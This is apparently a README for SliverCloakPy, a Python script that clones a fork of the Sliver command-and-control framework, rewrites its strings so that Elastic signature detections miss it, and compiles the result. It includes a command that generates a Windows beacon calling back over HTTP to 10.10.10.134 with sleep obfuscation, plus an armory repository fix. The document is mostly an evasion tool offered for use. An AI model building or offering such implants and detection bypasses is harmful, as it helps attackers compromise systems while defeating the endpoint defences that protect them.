# SliverCloakPy
Bypass common signature detections such as the ones from elastic.

Python script that does the job of slivercloak against armysick's sliver fork

slivercloak -> https://github.com/thelikes/slivercloak

armysick's sliver -> https://github.com/armysick/sliver

## Usage

Right now the script covers the Elastic Module, but you can replace whatever you want to be honest.

I did this small script because I have a hard time understanding all the work behind go, and I wanted to use armysick's fork, since it implements the ekko sleep module.

Just download the script and run `python3 builder.py`
This will automatically clone armysick's sliver, and get the necessary dependecies, afterwards, it will replace strings in the files and compile the proyect

Beacons are renamed to Krakens, and sliver-server/client is renamed to golder-server/client

## example of generating a beacon with ekko sleep obfuscation -B
```
sudo ./golder-server

generate kraken --http 10.10.10.134 -s /mnt/c/Payloads --arch amd64 --os windows -B -f exe

http
```

## armory problems fix
Since this is replacing strings, including the ones of armory, you wont be able to install armory packages straight away, here is a quick fix

```
armory add -u https://api.github.com/repos/sliverarmory/armory/releases -k "RWSBpxpRWDrD7Fe+VvRE3c2VEDC2NK80rlNCj+BX0gz44Xw07r6KQD9L" armory

armory install all
```
